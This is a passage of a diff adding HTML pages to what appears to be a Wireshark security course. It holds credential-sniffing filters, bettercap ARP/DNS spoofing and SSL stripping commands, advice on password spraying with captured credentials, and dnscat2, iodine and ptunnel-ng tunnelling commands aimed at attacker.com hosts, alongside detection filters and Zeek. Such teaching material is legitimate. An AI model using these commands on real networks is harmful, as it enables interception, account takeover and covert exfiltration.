+      <div class="fc-filter">http.authorization</div>
+      <div class="fc-desc">HTTP Basic Authentication credentials</div>
+      <div class="fc-example">Base64 encoded — decode: echo "dXNlcjpwYXNz" | base64 -d</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">http.request.method == "POST" && http contains "password"</div>
+      <div class="fc-desc">Login form submissions with password field</div>
+      <div class="fc-example">Follow TCP stream to read username + password in full</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">telnet</div>
+      <div class="fc-desc">All Telnet traffic — fully plaintext including passwords</div>
+      <div class="fc-example">Follow TCP stream — every keystroke including the password is visible</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">smtp.auth.password</div>
+      <div class="fc-desc">SMTP AUTH passwords for email sending</div>
+      <div class="fc-example">Email client credentials — often reused with other services</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">pop.request.command == "PASS"</div>
+      <div class="fc-desc">POP3 email retrieval passwords</div>
+      <div class="fc-example">POP3 on port 110 is plaintext — captures email credentials</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">http.cookie</div>
+      <div class="fc-desc">All HTTP session cookies in requests</div>
+      <div class="fc-example">Session token theft — replay in browser for account takeover</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">ntlmssp.auth.username</div>
+      <div class="fc-desc">NTLM authentication usernames (SMB/HTTP)</div>
+      <div class="fc-example">Reveals domain\username even in encrypted NTLM auth</div>
+    </div>
+  </div>
+
+  <div class="slbl">// §4.2 — HTTP BASIC AUTH DECODE</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">DECODING HTTP BASIC AUTH CREDENTIALS</div></div>
+    <div class="tbody"><span class="co"># Wireshark shows: Authorization: Basic dXNlcjpzdXBlcnNlY3JldA==</span>
+<span class="co"># The value after "Basic" is base64(username:password)</span>
+
+<span class="co"># Decode in terminal:</span>
+<span class="pr">$</span> <span class="cm">echo "dXNlcjpzdXBlcnNlY3JldA==" | base64 -d</span>
+<span class="hl2">user:supersecret</span>
+
+<span class="co"># tshark to extract all HTTP Basic Auth automatically:</span>
+<span class="pr">$</span> <span class="cm">tshark -r capture.pcap -Y "http.authorization" \
+  -T fields -e ip.src -e http.authorization 2>/dev/null</span>
+<span class="hl2">192.168.1.25    Basic dXNlcjpzdXBlcnNlY3JldA==</span>
+
+<span class="co"># Batch decode all found credentials:</span>
+<span class="pr">$</span> <span class="cm">tshark -r capture.pcap -Y "http.authorization" \
+  -T fields -e http.authorization 2>/dev/null \
+  | grep -oP '(?<=Basic )\S+' \
+  | base64 -d</span>
+<span class="hc">user:supersecret
+admin:P@ssw0rd123
+john.smith:Welcome1!</span></div>
+  </div>
+
+  <div class="slbl">// §4.3 — EXPORTING FILES FROM HTTP</div>
+  <div class="card">
+    <div class="clbl">FILE EXTRACTION FROM PCAP</div>
+    <p>Wireshark can reconstruct files transmitted over HTTP from a packet capture. This works for images, documents, executables — anything transferred over unencrypted HTTP.</p>
+    <ul class="ck">
+      <li><strong>In Wireshark GUI:</strong> File → Export Objects → HTTP → shows all files transferred → select any → Save</li>
+      <li><strong>tshark command line:</strong> <code>tshark -r capture.pcap --export-objects http,/tmp/extracted_files/</code></li>
+      <li><strong>What you get:</strong> HTML pages, images, executables, PDFs, Word documents — anything in unencrypted HTTP traffic</li>
+      <li><strong>Also works for:</strong> SMB (File → Export Objects → SMB) — extract files shared over SMB/Windows file sharing</li>
+      <li><strong>After extraction:</strong> Run <code>file</code> and <code>strings</code> on extracted executables — they may contain C2 domains, hardcoded credentials, or other IOCs</li>
+    </ul>
+  </div>
+
+  <div class="slbl">// §4 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You capture traffic and apply the filter <code>http.authorization</code>. You find the value <code>Basic YWRtaW46Q29tcGFueTEyMyE=</code>. What are the credentials and how would you use them offensively?</dt>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Base64 is not encryption — it is encoding. It has no key and can be reversed by anyone. Running it through base64 -d immediately reveals the plaintext.')"><span class="qk">A</span> The credentials are encrypted with base64 — you cannot decode them without the key</div>
+      <div class="qo" onclick="qa(this,'wrong','The format is username:password separated by a colon. Running base64 -d on this value gives admin:Company123! — two separate fields.')"><span class="qk">B</span> The value after Basic is the username only — the password is in a separate header</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! echo "YWRtaW46Q29tcGFueTEyMyE=" | base64 -d gives admin:Company123! The format is always base64(username:password) with a colon separator. Offensive use: (1) Direct login — try admin:Company123! against the same web application. (2) Password spray — try this password against every other service: SSH (ssh admin@target), RDP, email, VPN. People reuse passwords. (3) Enumerate admin access — admin credentials typically give you access to admin panels, config pages, and file upload features. (4) Check for credential stuffing opportunities — run against Hydra with a service list. (5) Report it — in a pentest this is a critical finding: plaintext credential exposure via unencrypted HTTP.')"><span class="qk">C</span> <code>base64 -d</code> gives <code>admin:Company123!</code> — try it against SSH, RDP, email, and VPN with the same password (credential reuse)</div>
+      <div class="qo" onclick="qa(this,'wrong','HTTP Digest auth uses a hash mechanism, not base64. Basic auth (which this is — labelled "Basic") always uses base64 encoding of the plaintext credentials.')"><span class="qk">D</span> This is HTTP Digest auth — the password is hashed and can only be cracked with Hashcat</div>
+    </div>
+    <div class="qfb" id="q3"></div>
+  </div>
+</div><!-- /p3 -->
+
+
+<!-- ══════════ §5 MITM ══════════ -->
+<div class="pnl" id="p4">
+  <div class="sh">
+    <div class="sh-num red">05</div>
+    <div class="sh-info">
+      <h2>Man-in-the-Middle & Traffic Injection</h2>
+      <p><span class="stag t-red">OFFENSIVE</span> ARP Spoofing · DNS Spoofing · SSL Stripping · Bettercap · Response Modification</p>
+    </div>
+  </div>
+
+  <div class="slbl">// §5.1 — BETTERCAP MITM WITH WIRESHARK</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">BETTERCAP + WIRESHARK — AUTOMATED MITM</div></div>
+    <div class="tbody"><span class="co"># Install bettercap:</span>
+<span class="pr">$</span> <span class="cm">sudo apt install bettercap -y</span>
+
+<span class="co"># Start bettercap on your interface:</span>
+<span class="pr">$</span> <span class="cm">sudo bettercap -iface eth0</span>
+
+<span class="co"># Inside bettercap interactive console:</span>
+<span class="ha">net.probe on</span>          <span class="co"># discover all hosts on network</span>
+<span class="ha">net.show</span>              <span class="co"># list discovered hosts with IP/MAC/hostname</span>
+<span class="ha">set arp.spoof.targets 192.168.1.10</span>   <span class="co"># target specific host</span>
+<span class="ha">arp.spoof on</span>          <span class="co"># start ARP poisoning</span>
+<span class="ha">net.sniff on</span>          <span class="co"># capture and display credentials automatically</span>
+<span class="hc">
+[net.sniff] [192.168.1.10 → 192.168.1.1] FTP USER admin
+[net.sniff] [192.168.1.10 → 192.168.1.1] FTP PASS S3cur3P@ss!
+[net.sniff] [192.168.1.10 → 192.168.1.1] HTTP POST /login user=john&pass=Welcome1
+</span>
+<span class="co"># Simultaneously open Wireshark to see full packet details:
+# bettercap handles the ARP poisoning
+# Wireshark gives you the deep packet analysis</span>
+
+<span class="co"># ── DNS SPOOFING ──────────────────────────────────────────────</span>
+<span class="ha">set dns.spoof.domains target-bank.com,login.corp.com</span>
+<span class="ha">set dns.spoof.address 192.168.1.99</span>   <span class="co"># your fake server IP</span>
+<span class="ha">dns.spoof on</span>
+<span class="co"># All DNS queries for those domains now return your IP
+# Set up a fake login page on 192.168.1.99 to harvest creds</span>
+
+<span class="co"># ── SSL STRIPPING ─────────────────────────────────────────────</span>
+<span class="ha">https.proxy on</span>
+<span class="co"># Downgrades HTTPS to HTTP where HSTS is not set
+# Wireshark then sees plaintext instead of TLS
+# Note: modern browsers with HSTS preloading prevent this</span></div>
+  </div>
+
+  <div class="slbl">// §5.2 — DETECTING MITM IN WIRESHARK</div>
+  <div class="card">
+    <div class="clbl">WHAT MITM LOOKS LIKE FROM THE VICTIM'S CAPTURE</div>
+    <ul class="ck">
+      <li><strong>Duplicate MACs for gateway IP:</strong> ARP table shows two different MACs claiming 192.168.1.1 — filter <code>arp.duplicate-address-detected</code></li>
+      <li><strong>ARP reply storm:</strong> High volume of unsolicited ARP replies from one MAC — filter <code>arp.opcode == 2</code> and sort by source MAC</li>
+      <li><strong>TTL anomaly:</strong> Packets from the "gateway" arrive with TTL one less than expected (they made one extra hop through the attacker)</li>
+      <li><strong>SSL certificate mismatch:</strong> TLS ServerHello shows unexpected certificate issuer — filter <code>tls.handshake.type == 11</code> and check certificate fields</li>
+      <li><strong>Latency spike:</strong> Round-trip times suddenly increase when MITM is active — the extra hop adds measurable delay</li>
+    </ul>
+  </div>
+
+  <div class="slbl">// §5 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You perform ARP spoofing and position yourself between a target and the gateway. You enable net.sniff on bettercap but see no HTTP credentials — only TLS traffic. The target is accessing https://mail.company.com. What is the most likely reason and what can you attempt?</dt>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','ARP spoofing works — you can see in Wireshark that the traffic is flowing through you (you see TLS packets). The issue is that the content is encrypted, not that the MITM failed.')"><span class="qk">A</span> ARP spoofing failed — the target is not sending traffic through you</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! The MITM is working — you can see TLS traffic flowing through you. But HTTPS encrypts the payload. Your options: (1) SSL Stripping — attempt to downgrade HTTPS to HTTP using bettercap https.proxy on. This only works if the site does NOT use HSTS. (2) Check Wireshark TLS ClientHello — the SNI field still reveals the exact domain being accessed (mail.company.com) even though content is encrypted. (3) If you have the target machine under control, install a fake CA certificate and intercept with a transparent proxy (Burp Suite in transparent proxy mode). (4) Check if the SSLKEYLOGFILE is accessible on a Windows machine to decrypt the session. (5) Focus on non-HTTPS traffic from the same target — they may be accessing other unencrypted services. The TLS metadata (SNI, certificate, timing) is still valuable reconnaissance even without decryption.')"><span class="qk">C</span> MITM is working but content is TLS-encrypted — try SSL stripping if no HSTS, or check SNI field in TLS ClientHello for domain intelligence</div>
+      <div class="qo" onclick="qa(this,'wrong','HTTPS does encrypt content but TLS ClientHello (which reveals the SNI/domain) happens before encryption. You can see the domain being accessed even without decrypting the content.')"><span class="qk">B</span> HTTPS is impossible to intercept — stop and try a different attack</div>
+      <div class="qo" onclick="qa(this,'wrong','Firewall rules don\'t protect against ARP-level attacks — they operate at higher network layers. You\'re already inside the network at the data link layer.')"><span class="qk">D</span> The firewall is blocking your ARP packets</div>
+    </div>
+    <div class="qfb" id="q4"></div>
+  </div>
+</div><!-- /p4 -->
+
+
+<!-- ══════════ §6 EVASION ══════════ -->
+<div class="pnl" id="p5">
+  <div class="sh">
+    <div class="sh-num purple">06</div>
+    <div class="sh-info">
+      <h2>Evading Wireshark & IDS Detection</h2>
+      <p><span class="stag t-purple">BYPASS</span> Fragmentation · Covert Channels · Port Mimicry · Timing Evasion · Decoy Traffic</p>
+    </div>
+  </div>
+
+  <div class="note np">
+    <div class="nico">👻</div>
+    <p><strong>Every evasion technique exploits a gap between what Wireshark/IDS sees and what actually happens.</strong> Fragmentation hides payload content across multiple small packets. Port mimicry hides C2 traffic inside legitimate protocol ports. Understanding these techniques from the attacker's side makes you a far better defender — you know exactly what to look for.</p>
+  </div>
+
+  <div class="slbl">// §6.1 — IP FRAGMENTATION EVASION</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">FRAGMENTATION ATTACK — HOW IT WORKS</div></div>
+    <div class="tbody"><span class="co"># IP fragmentation splits a packet into multiple smaller packets
+# Each fragment has only a partial payload
+# Many IDS systems inspect individual fragments — miss the full pattern
+# Wireshark reassembles fragments by default (Edit → Preferences → IPv4 → Enable)</span>
+
+<span class="co"># ── Fragment a payload across multiple small packets ─────────</span>
+<span class="pr">$</span> <span class="cm">nmap -f 192.168.1.10</span>             <span class="co"># 8-byte fragments (stealth scan)</span>
+<span class="pr">$</span> <span class="cm">nmap --mtu 24 192.168.1.10</span>       <span class="co"># 24-byte fragments</span>
+<span class="pr">$</span> <span class="cm">nmap -f -f 192.168.1.10</span>          <span class="co"># 16-byte fragments (double -f)</span>
+
+<span class="co"># What fragmentation looks like in Wireshark:
+# Packet 1: IP (Fragment offset=0, More fragments=1, Data: first 8 bytes)
+# Packet 2: IP (Fragment offset=1, More fragments=1, Data: next 8 bytes)
+# Packet 3: IP (Fragment offset=2, More fragments=0, Data: final bytes)
+# Wireshark labels them: [Reassembled IPv4 in frame: N]</span>
+
+<span class="co"># Wireshark filter for fragmented packets:</span>
+<span class="ha">ip.flags.mf == 1 || ip.frag_offset > 0</span>
+<span class="co"># MF = More Fragments flag
+# frag_offset > 0 = this is not the first fragment
+# These together show all fragments of a fragmented stream</span>
+
+<span class="co"># ── Overlapping fragments (Teardrop / IDS evasion) ───────────</span>
+<span class="co"># Send fragments that overlap — IDS sees payload A, host reassembles to payload B
+# Different OSes handle overlaps differently (Windows uses last, Linux uses first)
+# Scapy for crafting overlapping fragments:</span>
+<span class="pr">$</span> <span class="cm">python3 -c "
+from scapy.all import *
+# Fragment 1: bytes 0-15 (benign content)
+# Fragment 2: bytes 8-23 (overlaps — malicious content in overlap region)
+# IDS sees benign, host executes malicious
+"</span></div>
+  </div>
+
+  <div class="slbl">// §6.2 — PORT MIMICRY & PROTOCOL TUNNELLING</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">HIDING C2 TRAFFIC INSIDE LEGITIMATE PROTOCOLS</div></div>
+    <div class="tbody"><span class="co"># ── C2 over port 443 (HTTPS port, not actual HTTPS) ──────────</span>
+<span class="co"># Run a raw TCP C2 listener on port 443
+# Firewalls allow 443 outbound — most don't do deep inspection
+# Wireshark shows: TCP traffic on port 443 (looks like HTTPS)
+# But: no TLS handshake visible — it's just raw TCP on 443</span>
+
+<span class="co"># How defenders detect this in Wireshark:</span>
+<span class="ha">tcp.port == 443 && !tls</span>
+<span class="co"># Traffic on HTTPS port with NO TLS = suspicious — likely port mimicry</span>
+
+<span class="co"># ── HTTP-based C2 (blends with web traffic) ───────────────────</span>
+<span class="co"># C2 implant beacons via HTTP GET/POST — looks like browser traffic
+# Common pattern: regular interval GET requests to a CDN-fronted domain</span>
+<span class="co"># Wireshark detection:</span>
+<span class="ha">http.request && frame.time_delta < 0.001</span>
+<span class="co"># Very regular intervals in HTTP requests = beaconing pattern</span>
+
+<span class="co"># ── Domain Fronting ───────────────────────────────────────────</span>
+<span class="co"># TLS SNI shows: legitimate-cdn.com (bypasses SNI-based filtering)
+# HTTP Host header shows: actual-c2.com (the real destination)
+# Wireshark shows the SNI — you CANNOT see the Host header (it's encrypted)
+# Detection: use DNS query logs instead — DNS shows the real domain resolution</span>
+
+<span class="co"># ── Timing-based evasion ─────────────────────────────────────</span>
+<span class="co"># Regular beacons create patterns detectable with Wireshark I/O graphs
+# Randomise beacon interval: sleep(60 + random(-20, +20))
+# Wireshark Statistics > I/O Graph shows irregular traffic = harder to flag
+# But: total volume over time is still anomalous vs baseline</span></div>
+  </div>
+
+  <div class="slbl">// §6 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You are a defender and notice TCP traffic on port 443 from an internal machine, but the Wireshark display filter <code>tls</code> shows zero matching packets on that port. What does this strongly indicate and what is your next investigative step?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','TLS sometimes uses non-standard ports but port 443 is the standard HTTPS port. Traffic on 443 with no TLS handshake is highly suspicious — it means the traffic is not HTTPS despite using the HTTPS port.')"><span class="qk">A</span> Normal — TLS sometimes uses different port numbers</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Port mimicry or raw C2 beacon. Legitimate HTTPS on port 443 always begins with a TLS ClientHello — without it, the traffic is not HTTPS despite using the HTTPS port. This is a classic sign of a C2 implant using port 443 to bypass firewall rules. Next steps: (1) Apply filter: tcp.port == 443 && !tls — confirm how many packets match. (2) Follow TCP Stream on one of these flows — see the actual payload content. C2 beacons often have recognisable patterns (fixed-length beacons, specific byte sequences, regular intervals). (3) Check Statistics > Conversations — does this traffic show regular timing intervals? (beaconing). (4) Look up the destination IP in threat intel (VirusTotal, AbuseIPDB). (5) Check dns logs — what domain did this IP resolve from? (6) Isolate the host immediately if confirmed malicious — this is likely an active C2 connection.')"><span class="qk">B</span> Port mimicry — likely a C2 beacon using port 443 to bypass firewalls. Follow the TCP stream and check for regular beaconing intervals in Statistics > Conversations</div>
+      <div class="qo" onclick="qa(this,'wrong','Wireshark decodes TLS even when it cannot decrypt it — the TLS handshake packets (ClientHello, ServerHello) are visible regardless of encryption. No TLS at all means no TLS handshake occurred.')"><span class="qk">C</span> Wireshark cannot display TLS — the traffic is there but invisible</div>
+      <div class="qo" onclick="qa(this,'wrong','A broken connection would show TCP RST or FIN packets. You described ongoing traffic — packets are flowing on port 443 without TLS.')"><span class="qk">D</span> Broken TLS connection — the handshake failed mid-way</div>
+    </div>
+    <div class="qfb" id="q5"></div>
+  </div>
+</div><!-- /p5 -->
+
+
+<!-- ══════════ §7 TUNNELLING ══════════ -->
+<div class="pnl" id="p6">
+  <div class="sh">
+    <div class="sh-num purple">07</div>
+    <div class="sh-info">
+      <h2>Encrypted & Tunnelled Traffic</h2>
+      <p><span class="stag t-purple">BYPASS</span> DNS Tunnelling · ICMP Tunnelling · TLS Decryption · dnscat2 · iodine</p>
+    </div>
+  </div>
+
+  <div class="slbl">// §7.1 — DNS TUNNELLING IN WIRESHARK</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">DNS TUNNELLING — DETECTION IN WIRESHARK</div></div>
+    <div class="tbody"><span class="co"># DNS tunnelling encodes data inside DNS query names and TXT records
+# Data flows: malware → DNS query → your C2 DNS server → command back in response
+# Completely bypasses most firewalls (DNS port 53 is always open)
+# Tools: dnscat2, iodine, dns2tcp</span>
+
+<span class="co"># ── What DNS tunnelling looks like in Wireshark ───────────────</span>
+<span class="co"># Normal DNS query: "www.google.com"   (short, readable)</span>
+<span class="co"># Tunnelled DNS:    "YWRtaW46Q29tcGFueTEy.c2domain.com"  (long encoded subdomain)</span>
+
+<span class="co"># Detection filter — long DNS queries (legitimate rarely exceed 30 chars):</span>
+<span class="ha">dns.qry.name.len > 52</span>
+
+<span class="co"># High volume of DNS queries to same domain (data exfil pattern):</span>
+<span class="ha">dns && dns.qry.name contains ".c2domain.com"</span>
+
+<span class="co"># TXT record responses (command delivery channel):</span>
+<span class="ha">dns.qry.type == 16</span>    <span class="co"># Type 16 = TXT record</span>
+
+<span class="co"># Wireshark Statistics > DNS to see query rate by domain — spikes are suspicious</span>
+
+<span class="co"># ── iodine: IP-over-DNS tunnel ────────────────────────────────</span>
+<span class="co"># Server side (attacker controlled DNS server):</span>
+<span class="pr">$</span> <span class="cm">iodined -f -c -P password 10.0.0.1 tunnel.attacker.com</span>
+<span class="co"># Client side (on target machine):</span>
+<span class="pr">$</span> <span class="cm">iodine -f -P password tunnel.attacker.com</span>
+<span class="co"># Creates a tunnel interface — all traffic routes over DNS
+# In Wireshark: massive volume of DNS queries, each with encoded data</span>
+
+<span class="co"># ── dnscat2: C2 over DNS ──────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">ruby dnscat2.rb --dns "domain=c2.attacker.com"</span>  <span class="co"># server</span>
+<span class="pr">$</span> <span class="cm">./dnscat --dns c2.attacker.com</span>                    <span class="co"># client on target</span>
+<span class="co"># Wireshark signature: SYN queries with encoded payloads
+# Each "session" appears as sequential subdomains: a.b.c.d.c2.attacker.com</span></div>
+  </div>
+
+  <div class="slbl">// §7.2 — DECRYPTING TLS WITH SSLKEYLOGFILE</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">TLS DECRYPTION — SEE INSIDE HTTPS</div></div>
+    <div class="tbody"><span class="co"># Modern TLS uses Perfect Forward Secrecy (PFS)
+# You CANNOT decrypt TLS with just the server private key
+# BUT: browsers and apps log session keys to SSLKEYLOGFILE
+# With this log, Wireshark decrypts the session completely</span>
+
+<span class="co"># ── Set up SSLKEYLOGFILE on Linux/Mac ────────────────────────</span>
+<span class="pr">$</span> <span class="cm">export SSLKEYLOGFILE=/home/user/ssl-keys.log</span>
+<span class="pr">$</span> <span class="cm">wireshark &</span>                    <span class="co"># start Wireshark</span>
+<span class="pr">$</span> <span class="cm">firefox https://target.com &</span>   <span class="co"># browser inherits the env var</span>
+<span class="co"># Keys are written to /home/user/ssl-keys.log during the session</span>
+
+<span class="co"># ── Configure Wireshark to use the key log ────────────────────</span>
+<span class="co"># Edit → Preferences → Protocols → TLS</span>
+<span class="co"># (Pre)-Master-Secret log filename: /home/user/ssl-keys.log</span>
+<span class="co"># Click OK → all captured TLS traffic is now decrypted!</span>
+
+<span class="co"># ── On Windows ────────────────────────────────────────────────</span>
+<span class="co"># System Properties → Environment Variables → New</span>
+<span class="co"># Variable: SSLKEYLOGFILE  Value: C:\Users\user\ssl-keys.log</span>
+<span class="co"># Restart browser → keys logged automatically</span>
+
+<span class="co"># ── What you see after decryption ────────────────────────────</span>
+<span class="co"># The HTTP/2 or HTTP/1.1 application data is now visible:
+# Full HTTPS request headers including cookies, auth tokens
+# POST body contents including form data and API calls
+# Server responses including JSON data and HTML content
+# This is how security researchers analyse malware HTTPS C2 traffic</span>
+
+<span class="co"># ── Wireshark filter for decrypted content ───────────────────</span>
+<span class="ha">http2 || http</span>   <span class="co"># after TLS decryption, HTTPS shows as HTTP</span></div>
+  </div>
+
+  <div class="slbl">// §7.3 — ICMP TUNNELLING</div>
+  <div class="card">
+    <div class="clbl">DATA HIDDEN IN PING PACKETS</div>
+    <p>ICMP echo requests (ping) carry a data payload field. Normally this contains benign filler data. Attackers stuff arbitrary data — including commands and responses — into this field. Many firewalls allow ICMP ping through. From Wireshark, ICMP tunnel traffic looks like ping but the payload contains encoded data instead of the normal <code>abcdefg...</code> pattern.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">ICMP TUNNELLING DETECTION</div></div>
+    <div class="tbody"><span class="co"># Normal ICMP payload: "abcdefghijklmnopqrstuvwxyz012345"
+# Tunnelled ICMP payload: base64/encrypted C2 data</span>
+
+<span class="co"># Show all ICMP traffic:</span>
+<span class="ha">icmp</span>
+
+<span class="co"># Large ICMP payloads (normal ping is 32-56 bytes, tunnel is larger):</span>
+<span class="ha">icmp && data.len > 64</span>
+
+<span class="co"># Detect non-standard ICMP data (not the normal alphabet pattern):
+# In packet detail: ICMP → Data → check the content
+# Legitimate: "abcdefghijklmnopqrstuvwxyz012345..."
+# Tunnelled:  base64 strings, encrypted binary blobs</span>
+
+<span class="co"># High rate of ICMP (tunnelling generates continuous ping traffic):</span>
+<span class="co"># Statistics > I/O Graph → filter icmp → look for sustained traffic</span>
+
+<span class="co"># Tool: ptunnel — TCP over ICMP tunnel</span>
+<span class="pr">$</span> <span class="cm">ptunnel-ng -p attacker.com -lp 8080 -da target.com -dp 22</span>
+<span class="co"># SSH through ICMP — from Wireshark looks like persistent ping flood
+# Each "ping" carries SSH data in the ICMP payload</span></div>
+  </div>
+
+  <div class="slbl">// §7 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You see DNS queries like <code>aGVsbG8gd29ybGQ.corp-exfil.attacker.com</code>, <code>dGhpcyBpcyBhIHRl.corp-exfil.attacker.com</code>, and 847 more similar queries in 60 seconds, all going to the same parent domain. What is happening?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','CDN domains use a few standardised subdomains. 847 unique subdomain queries with base64-looking names in 60 seconds is not CDN behaviour — it is data exfiltration via DNS tunnelling.')"><span class="qk">A</span> Normal CDN traffic — content delivery networks use many subdomains</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! DNS data exfiltration via tunnelling. The subdomain portion (aGVsbG8gd29ybGQ, dGhpcyBpcyBhIHRl) contains base64-encoded data. Each DNS query exfiltrates a chunk of data to the attacker-controlled DNS server for corp-exfil.attacker.com. The DNS server logs the queries and decodes the exfiltrated data. 847 queries in 60 seconds = ~14 queries/second. At ~30 bytes of encoded data per query, that is ~420 bytes/second of exfiltration — slow but completely unblocked by most firewalls. Wireshark investigation: (1) dns.qry.name.len > 52 to find all long subdomains. (2) Statistics > DNS to see query rate. (3) Extract all subdomain prefixes and base64 decode them to recover the exfiltrated content. Block: DNS filtering (only allow queries to approved resolvers) or DNS inspection that detects encoded subdomains.')"><span class="qk">B</span> DNS data exfiltration — the subdomain prefix contains base64-encoded data being exfiltrated chunk by chunk to an attacker-controlled DNS server</div>
+      <div class="qo" onclick="qa(this,'wrong','DGA generates random-looking domains to find active C2 servers — the pattern is random strings as full domains, not structured base64 prefixes with a consistent parent domain. This is active exfiltration, not DGA.')"><span class="qk">C</span> Domain Generation Algorithm (DGA) malware looking for its C2 server</div>
+      <div class="qo" onclick="qa(this,'wrong','DNS cache poisoning attacks send fake DNS responses — they do not generate high volumes of outbound DNS queries with encoded subdomain names.')"><span class="qk">D</span> DNS cache poisoning attack against your resolver</div>
+    </div>
+    <div class="qfb" id="q6"></div>
+  </div>
+</div><!-- /p6 -->
+
+
+<!-- ══════════ §8 DEFENSIVE ══════════ -->
+<div class="pnl" id="p7">
+  <div class="sh">
+    <div class="sh-num green">08</div>
+    <div class="sh-info">
+      <h2>Detection, Alerting & Forensics</h2>
+      <p><span class="stag t-blue">DEFENSIVE</span> Attack Detection Filters · Statistics · Zeek · Snort Rules · PCAP Forensics</p>
+    </div>
+  </div>
+
+  <div class="note ng">
+    <div class="nico">🛡️</div>
+    <p><strong>Everything you've learned offensively in this lesson has a defensive counterpart.</strong> Every attack leaves a signature in packet captures. This section builds your detection toolkit — the Wireshark filters, statistics views, and Zeek/Snort rules that catch each attack technique you've studied.</p>
+  </div>
+
+  <div class="slbl">// §8.1 — ATTACK DETECTION FILTER REFERENCE</div>
+  <table class="tbl">
+    <tr><th>ATTACK</th><th>WIRESHARK FILTER</th><th>WHAT TO LOOK FOR</th></tr>
+    <tr><td><span class="hcr">Port Scan (Nmap)</span></td><td><code>tcp.flags.syn==1 && tcp.flags.ack==0</code></td><td>Many SYNs from one IP to many ports in seconds. Statistics > Conversations to see port spread.</td></tr>
+    <tr><td><span class="hcr">ARP Poisoning</span></td><td><code>arp.duplicate-address-detected</code></td><td>Two MACs claiming same IP. Wireshark auto-flags "[Duplicate IP address detected]"</td></tr>
+    <tr><td><span class="hcr">SYN Flood DoS</span></td><td><code>tcp.flags.syn==1 && tcp.flags.ack==0</code></td><td>Thousands of SYNs, no corresponding ACKs completing handshakes. I/O graph spike.</td></tr>
+    <tr><td><span class="hcr">DNS Tunnelling</span></td><td><code>dns.qry.name.len > 52</code></td><td>Long subdomain names with encoded data. High query rate to single domain.</td></tr>
+    <tr><td><span class="hcr">Port Mimicry C2</span></td><td><code>tcp.port==443 && !tls</code></td><td>TCP on HTTPS port with no TLS handshake. Regular beacon intervals.</td></tr>
+    <tr><td><span class="hcr">Credential Harvest</span></td><td><code>ftp.request.command=="PASS" || http.authorization</code></td><td>Plaintext credentials in transit. Follow TCP stream for full context.</td></tr>
+    <tr><td><span class="hcr">ICMP Tunnel</span></td><td><code>icmp && data.len > 64</code></td><td>Oversized ICMP payloads. Non-alphabet payload content. Sustained ping traffic.</td></tr>
+    <tr><td><span class="hcr">Fragmentation</span></td><td><code>ip.flags.mf==1 || ip.frag_offset > 0</code></td><td>Unusual fragmentation — especially with tiny fragment sizes (8 bytes).</td></tr>
+    <tr><td><span class="hcr">SSL Stripping</span></td><td><code>http && http.request.uri contains "https://"</code></td><td>HTTP traffic referencing HTTPS URLs — SSLstrip redirect signatures.</td></tr>
+    <tr><td><span class="hcr">DNS Exfil</span></td><td><code>dns.qry.type==16 && dns.resp.len > 100</code></td><td>Large TXT record responses. TXT records used as command delivery.</td></tr>
+  </table>
+
+  <div class="slbl">// §8.2 — WIRESHARK STATISTICS FOR ANOMALY DETECTION</div>
+  <div class="two">
+    <div class="card">
+      <div class="clbl">STATISTICS > CONVERSATIONS</div>
+      <ul class="ck">
+        <li>Shows all unique host-to-host pairs and their traffic volumes</li>
+        <li>Sort by Bytes — the highest volume conversations stand out</li>
+        <li>Sort by Duration — long-running connections may be C2 beacons</li>
+        <li>TCP tab → look for connections with unusual packet ratios (many tiny packets = beaconing)</li>
+        <li>Right-click any conversation → Apply as Filter → instantly filter the packet list</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="clbl">STATISTICS > I/O GRAPH</div>
+      <ul class="ck">
+        <li>Traffic volume over time — spikes indicate scans, floods, or exfiltration</li>
+        <li>Add a filter line: <code>dns.qry.name.len > 52</code> — shows DNS tunnel traffic as a separate colour</li>
+        <li>Regular periodic spikes = C2 beaconing pattern</li>
+        <li>Sustained flat high volume = data exfiltration</li>
+        <li>Sudden traffic to a new external IP = potential C2 check-in</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="slbl">// §8.3 — ZEEK (FORMERLY BRO) — AUTOMATED LOG GENERATION</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">ZEEK — CONVERT PCAP TO STRUCTURED LOGS</div></div>
+    <div class="tbody"><span class="co"># Zeek analyses PCAP files and produces structured log files
+# Much faster for large captures than manual Wireshark analysis</span>
+
+<span class="co"># Install Zeek:</span>
+<span class="pr">$</span> <span class="cm">sudo apt install zeek -y</span>
+
+<span class="co"># Analyse a PCAP file:</span>
+<span class="pr">$</span> <span class="cm">zeek -r capture.pcap</span>
+
